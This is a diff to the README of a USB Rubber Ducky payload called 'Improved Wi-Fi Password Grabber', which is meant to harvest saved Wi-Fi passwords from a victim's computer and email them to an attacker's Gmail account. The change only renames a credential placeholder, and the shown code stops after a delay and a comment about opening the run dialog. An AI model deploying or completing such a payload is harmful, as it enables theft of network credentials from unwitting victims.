@@ -1,6 +1,6 @@
 ## Slightly improved version of [WiFi password grabber](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber) by Siem
 
-### Make sure to change "YOUREMAIL@gmail.com" with your G-Mail, and "PASSWORD" with your password
+### Make sure to change "YOUREMAIL@gmail.com" with your G-Mail, and "YOURPASSWORD" with your password
 
 ### Code:
 ```
@@ -8,7 +8,7 @@ REM Title       : Improved Wi-Fi Password Grabber
 REM Author      : Jacob Collins
 REM Version     : 3
 REM Description : An improved version of the "WiFi password grabber" by Siem. It is a bit faster, and shorter.
-REM DISCLAIMER  : Make sure to replace all instances of "YOUREMAIL@gmail.com" (without quotes), with your actual e-mail (MUST BE G-MAIL!), and "PASSWORD" (without quotes) with your password.
+REM DISCLAIMER  : Make sure to replace all instances of "YOUREMAIL@gmail.com" (without quotes), with your actual e-mail (MUST BE G-MAIL!), and "YOURPASSWORD" (without quotes) with your password.
 REM DISCLAIMER  : Make sure to enable "Allow less secure apps". Here is the link: https://myaccount.google.com/lesssecureapps
 DELAY 1000
 REM --------> Open the run dialog
